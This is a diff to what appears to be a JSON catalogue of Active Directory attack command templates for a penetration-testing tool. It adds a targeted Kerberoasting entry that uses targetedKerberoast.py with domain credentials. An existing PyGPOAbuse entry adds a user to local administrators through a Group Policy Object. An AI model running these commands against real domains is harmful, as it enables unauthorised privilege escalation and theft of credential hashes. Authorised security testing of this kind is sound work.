@@ -195,6 +195,12 @@
           "name": "PyGPOAbuse scheduled task",
           "description": "Abuse a GPO to add a user to local administrators.",
           "template": "python3 pygpoabuse.py {DOMAIN}/{USER}:'{PASSWORD}' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup administrators {USER} /add'"
+        },
+        {
+          "id": "smb-ad-029",
+          "name": "Targeted Kerberoasting (GenerericWrite/GenericAll)",
+          "description": "Abuse of a write permission on the servicePrincipalName attribute. Set and delete the temporary SPN.",
+          "template": "python3 targetedKerberoast.py -v -d {DOMAIN} -u {USER} -p '{PASSWORD}'"
         }
       ]
     },
